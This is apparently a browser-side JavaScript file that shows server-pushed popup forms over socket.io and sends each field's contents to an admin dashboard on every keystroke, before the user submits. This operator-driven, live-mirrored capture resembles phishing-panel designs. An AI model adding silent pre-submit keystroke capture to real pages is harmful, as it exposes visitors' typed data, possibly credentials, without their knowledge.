const socket = io();

let sessionId = null;
let currentFormId = null;

const overlay = document.getElementById('popupOverlay');
const popupTitle = document.getElementById('popupTitle');
const popupForm = document.getElementById('popupForm');

socket.on('connect', () => {
  socket.emit('user:register', { pageId: window.PAGE_ID }, (resp) => {
    if (resp && resp.error) {
      console.error('Registration failed:', resp.error);
      return;
    }
    sessionId = resp.sessionId;
  });
});

socket.on('form:open', ({ formId, label, fields }) => {
  currentFormId = formId;
  renderForm(label, fields);
  overlay.hidden = false;
});

socket.on('form:close', ({ formId }) => {
  if (formId !== currentFormId) return;
  closePopup();
});

function renderForm(label, fields) {
  popupTitle.textContent = label;
  popupForm.innerHTML = '';

  for (const field of fields) {
    const group = document.createElement('div');
    group.className = 'field-group';

    const labelEl = document.createElement('label');
    labelEl.textContent = field.label + (field.required ? ' *' : '');
    labelEl.setAttribute('for', `field_${field.name}`);
    group.appendChild(labelEl);

    let input;
    if (field.type === 'textarea') {
      input = document.createElement('textarea');
    } else {
      input = document.createElement('input');
      input.type = field.type || 'text';
    }
    input.id = `field_${field.name}`;
    input.name = field.name;
    if (field.required) input.required = true;

    // Emit on every keystroke so the admin dashboard mirrors typing live.
    input.addEventListener('input', () => {
      if (!currentFormId) return;
      socket.emit('user:formInput', {
        formId: currentFormId,
        field: field.name,
        value: input.value
      });
    });

    group.appendChild(input);
    popupForm.appendChild(group);
  }

  const submitBtn = document.createElement('button');
  submitBtn.type = 'submit';
  submitBtn.className = 'popup-submit';
  submitBtn.textContent = 'Submit';
  popupForm.appendChild(submitBtn);

  popupForm.onsubmit = (e) => {
    e.preventDefault();
    const data = {};
    for (const field of fields) {
      const input = document.getElementById(`field_${field.name}`);
      data[field.name] = input ? input.value : '';
    }
    socket.emit('user:formSubmit', { formId: currentFormId, data });
    showThanks();
  };
}

function showThanks() {
  popupForm.innerHTML = '<div class="popup-thanks">Thanks! We received your info.</div>';
  setTimeout(closePopup, 1500);
}

function closePopup() {
  overlay.hidden = true;
  currentFormId = null;
  popupForm.innerHTML = '';
}
